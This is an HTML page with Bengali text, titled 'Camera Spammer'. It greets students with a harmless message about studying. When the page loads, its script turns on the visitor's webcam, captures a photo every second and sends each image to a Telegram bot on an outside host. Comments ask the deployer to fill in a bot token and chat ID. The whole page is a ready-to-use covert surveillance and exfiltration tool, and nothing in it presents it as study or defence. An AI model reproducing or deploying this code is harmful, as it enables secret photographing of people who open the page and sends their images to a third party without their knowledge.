<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ক্যামেরা স্প্যামার</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .message {
            font-size: 24px;
            color: black;
            margin-bottom: 20px;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
        }
        #video {
            width: 320px;
            height: 240px;
            background-color: #000;
            border: 2px solid #333;
        }
        #status {
            margin-top: 20px;
            font-size: 18px;
            color: red;
        }
    </style>
</head>
<body>
    <div class="message">
        <p>কেমন আছো তোমরা</p>
        <p>ঠিক মতো পড়াশোনা করছো তো</p>
        <p>পড়তে হবে নকল আর হবে না</p>
    </div>

    <video id="video" autoplay muted></video>
    <div id="status">ক্যামেরা চালু হচ্ছে...</div>

    <script>
        // Replace with your Telegram Bot Token and Chat ID
        const BOT_TOKEN = "YOUR_BOT_TOKEN"; // এখানে তোর টোকেন বসা
        const CHAT_ID = "YOUR_CHAT_ID"; // এখানে তোর চ্যাট আইডি বসা

        // Function to update status
        function updateStatus(text) {
            document.getElementById("status").textContent = text;
        }

        // Function to send a photo to Telegram
        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", photoBlob, "spam.jpg");

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData,
                });
                if (response.ok) {
                    updateStatus("ফটো পাঠানো হইছে! 😈");
                } else {
                    updateStatus("ফটো পাঠানো যায় নাই! ত্রুটি: " + response.statusText);
                }
            } catch (error) {
                updateStatus("ফটো পাঠানো যায় নাই! ত্রুটি: " + error.message);
            }
        }

        // Function to take a photo and send it
        async function takePhotoAndSend() {
            const video = document.getElementById("video");
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to blob (image)
            canvas.toBlob(async (blob) => {
                await sendPhotoToTelegram(blob);
            }, "image/jpeg");
        }

        // Function to spam photos every 1 second
        function spamPhotos() {
            setInterval(async () => {
                updateStatus("ফটো তোলা হচ্ছে...");
                await takePhotoAndSend();
            }, 1000); // 1 second interval
        }

        // Start the camera and spam
        async function startCameraAndSpam() {
            try {
                updateStatus("ক্যামেরা চালু করা হচ্ছে...");
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById("video");
                video.srcObject = stream;
                spamPhotos(); // Start spamming after camera starts
                updateStatus("ক্যামেরা চালু হইছে! স্প্যাম শুরু হইছে... 😈");
            } catch (error) {
                updateStatus("ক্যামেরা চালু করা যায় নাই! অনুমতি দাও, _ব্যাটা_ 😤");
                console.error("Camera error:", error);
            }
        }

        // Start everything when the page loads
        window.onload = startCameraAndSpam;
    </script>
</body>
</html>
